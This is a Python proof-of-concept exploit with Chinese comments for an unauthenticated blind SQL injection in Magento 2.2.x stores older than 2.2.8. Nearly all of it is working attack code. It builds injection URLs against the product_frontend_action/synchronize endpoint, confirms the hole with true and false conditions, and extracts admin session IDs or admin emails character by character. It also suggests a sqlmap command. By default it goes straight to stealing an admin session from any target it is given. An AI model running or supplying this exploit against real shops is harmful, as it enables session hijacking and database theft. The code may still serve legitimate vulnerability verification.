#!/usr/bin/env python3
"""
Magento 2.2 SQL注入漏洞 POC
适用版本: Magento 2.2.x < 2.2.8

==================== 漏洞描述 ====================
【漏洞原理】
Magento 2.2.7及之前版本中prepareSqlCondition函数存在二次格式化字符串缺陷，
导致引入非预期的单引号。通过/catalog/product_frontend_action/synchronize端点
的ids参数可注入SQL语句，实现boolean-based盲注。

【影响范围】
- Magento 2.2.x < 2.2.8
- 端口: 8080
- 数据库: mysql:5.7 (root/root)

【危害等级】
- 无需认证SQL盲注
- 可提取管理员session
- CVSS评分: 9.1 (Critical)

==================== 环境要求 ====================
- Python 3.6+
- requests库

==================== 验证步骤 ====================
1. 基础检测:
   python magento2_sqli.py http://target:8080 --check-only

2. 盲注提取管理员session:
   python magento2_sqli.py http://target:8080

3. 自定义提取:
   python magento2_sqli.py http://target:8080 -c "SELECT session_id FROM admin_user_session"

==================== 预期结果 ====================
- 成功时: True/False条件返回不同的HTTP状态码
- 失败时: Magento版本已修复
"""

import sys
import json
import re
import argparse
import requests
from typing import Dict, Optional
from urllib.parse import urljoin, quote


class Magento2SQLiPOC:
    """Magento 2.2 SQL注入漏洞 POC"""

    VULN_NAME = "Magento 2.2 SQL Injection (prepareSqlCondition)"
    CVE_ID = "N/A (Magento 2.2.x < 2.2.8)"
    SEVERITY = "CRITICAL (CVSS 9.1)"
    AFFECTED = "Magento 2.2.x < 2.2.8"

    INJECTION_URL = "/catalog/product_frontend_action/synchronize"

    def __init__(self, target: str, timeout: int = 15, proxy: str = None,
                 verify_ssl: bool = False):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.proxy = proxy
        self.verify_ssl = verify_ssl

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = self.verify_ssl
        if self.proxy:
            session.proxies = {"http": self.proxy, "https": self.proxy}
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        if not self.verify_ssl:
            requests.packages.urllib3.disable_warnings()
        return session

    def _build_injection_url(self, condition: str) -> str:
        """构造SQL注入URL"""
        base = urljoin(self.target, self.INJECTION_URL)
        # 注入点在ids[0][product_id][to]参数
        # 使用)))闭合原SQL, 然后注入OR条件
        payload = f")))+OR+({condition})+--+-"
        return f"{base}?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]={payload}"

    def _test_condition(self, session: requests.Session, condition: str) -> bool:
        """测试SQL条件是否为真"""
        url = self._build_injection_url(condition)
        try:
            resp = session.get(url, timeout=self.timeout)
            # True条件通常返回200(有数据), False返回500或不同状态
            return resp.status_code == 200
        except Exception:
            return False

    def check(self) -> Dict:
        """
        步骤1: 检查Magento服务状态
        步骤2: 检测SQL注入(boolean-based)
        """
        result = {
            "vulnerability": self.VULN_NAME,
            "target": self.target,
            "status": "unknown",
            "details": [],
            "conclusion": ""
        }
        session = self._create_session()

        print("[*] 步骤1/2: 检查Magento服务状态...")
        try:
            resp = session.get(self.target, timeout=self.timeout)
            if resp.status_code == 200:
                if "Magento" in resp.text or "magento" in resp.text:
                    print(f"[+] Magento服务正常")
                    result["details"].append(f"HTTP {resp.status_code}")
                else:
                    result["details"].append(f"HTTP {resp.status_code} (非标准Magento)")
            else:
                result["details"].append(f"状态码: {resp.status_code}")
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"服务不可达: {e}"
            return result

        print("[*] 步骤2/2: 检测SQL注入(boolean-blind)...")
        # 测试两个条件: TRUE(1=1)和FALSE(1=0)
        result_true = self._test_condition(session, "SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1")
        result_false = self._test_condition(session, "SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0")

        result["details"].append(f"True(1=1) -> {result_true}")
        result["details"].append(f"False(1=0) -> {result_false}")

        if result_true != result_false:
            result["status"] = "vulnerable"
            result["conclusion"] = (
                "Magento存在SQL注入漏洞(boolean-based)\n"
                "True和False条件返回不同结果\n"
                "使用-c参数提取数据:\n"
                "  python magento2_sqli.py <target> -c \"SELECT session_id FROM admin_user_session\""
            )
        else:
            result["status"] = "not_vulnerable"
            result["conclusion"] = "True/False条件结果相同，目标可能已修复"

        return result

    def exploit(self, command: str = "SELECT session_id FROM admin_user_session") -> Dict:
        """
        利用盲注提取数据(逐字符提取)
        使用二分法按字符提取SQL查询结果
        """
        result = {
            "vulnerability": self.VULN_NAME,
            "target": self.target,
            "command": command,
            "status": "exploiting",
            "details": [],
            "output": "",
            "conclusion": ""
        }
        session = self._create_session()

        print(f"[*] 盲注提取: {command}")
        print("[*] 先检测True/False条件...")

        if not self._test_condition(session, "SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1"):
            result["status"] = "failed"
            result["conclusion"] = "True条件不成立，注入可能无效"
            return result

        # 提取结果长度
        print("[*] 确定结果长度...")
        length = 0
        for i in range(1, 256):
            cond = f"SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+(SELECT+LENGTH(({command})))+%3d{i}"
            if self._test_condition(session, cond):
                length = i
                break
        result["details"].append(f"结果长度: {length}")

        if length == 0:
            result["details"].append("未检测到有效长度")
            result["output"] = "(可能为空结果或注入不适用)"

            # 尝试直接返回简单信息
            result["status"] = "suspected_vulnerable"
            sqlmap_url = self._build_injection_url("1")
            result["conclusion"] = (
                "SQL注入存在但可能无法通过此方式进行字符提取。\n"
                "建议使用sqlmap:\n"
                f"  sqlmap -u '{sqlmap_url}' --level 3 --risk 1 --batch"
            )
            return result

        # 逐字符提取 (简化: 只提取前200字符)
        print(f"[*] 提取 {length} 个字符...")
        extracted = ""
        for pos in range(1, min(length + 1, 201)):
            found = False
            for char_code in range(32, 127):
                cond = (
                    f"SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+"
                    f"(SELECT+ORD(SUBSTRING(({command}),{pos},1)))%3d{char_code}"
                )
                if self._test_condition(session, cond):
                    extracted += chr(char_code)
                    sys.stdout.write(chr(char_code))
                    sys.stdout.flush()
                    found = True
                    break
            if not found:
                extracted += "?"
                sys.stdout.write("?")
                sys.stdout.flush()

        result["output"] = extracted
        result["status"] = "exploited"
        result["conclusion"] = f"提取完成 ({len(extracted)} chars)"

        return result

    def run(self, command: str = "") -> Dict:
        print(f"[*] {self.VULN_NAME} - 开始验证")
        print(f"[*] 目标: {self.target}")
        print(f"[*] 严重等级: {self.SEVERITY}")
        print("-" * 60)
        if command:
            return self.exploit(command)
        return self.check()

    def print_result(self, result: Dict):
        status = result.get("status", "unknown")
        icons = {"exploited": "[+]", "vulnerable": "[+]", "suspected_vulnerable": "[?]",
                 "failed": "[-]", "not_vulnerable": "[-]", "error": "[!]"}
        icon = icons.get(status, "[-]")
        print(f"\n{'=' * 60}")
        print(f"{icon} 漏洞: {result['vulnerability']}")
        print(f"    目标: {result['target']}")
        print(f"    状态: {status}")
        if result.get("command"):
            print(f"    SQL: {result['command']}")
        if result.get("output"):
            out = result['output']
            print(f"    输出:\n{out[:500]}")
        print(f"    结论: {result.get('conclusion', '')}")
        print(f"{'=' * 60}")


def main():
    parser = argparse.ArgumentParser(
        description="Magento 2.2 SQL注入漏洞验证POC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  python magento2_sqli.py http://target:8080 --check-only
  python magento2_sqli.py http://target:8080 -c "SELECT session_id FROM admin_user_session"
  python magento2_sqli.py http://target:8080 -c "SELECT email FROM admin_user LIMIT 1"
        """
    )
    parser.add_argument("target", help="目标URL (e.g., http://192.168.1.100:8080)")
    parser.add_argument("--check-only", action="store_true", help="仅检测不利用")
    parser.add_argument("-c", "--command", help="SQL查询语句 (默认: 提取admin session)")
    parser.add_argument("-t", "--timeout", type=int, default=15, help="请求超时(秒)")
    parser.add_argument("--proxy", help="HTTP代理")
    parser.add_argument("-k", "--insecure", action="store_true", help="跳过SSL验证")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("--output", choices=["text", "json"], default="text")
    args = parser.parse_args()

    poc = Magento2SQLiPOC(
        target=args.target, timeout=args.timeout,
        proxy=args.proxy, verify_ssl=not args.insecure
    )

    result = None
    if args.check_only:
        result = poc.check()
    elif args.command:
        result = poc.run(args.command)
    else:
        print("[*] 默认: 提取管理员session...")
        result = poc.run("SELECT+session_id+FROM+admin_user_session+LIMIT+1")

    if result:
        if args.output == "json":
            print(json.dumps(result, indent=2, ensure_ascii=False))
        else:
            poc.print_result(result)
    else:
        result = poc.run()


if __name__ == "__main__":
    main()
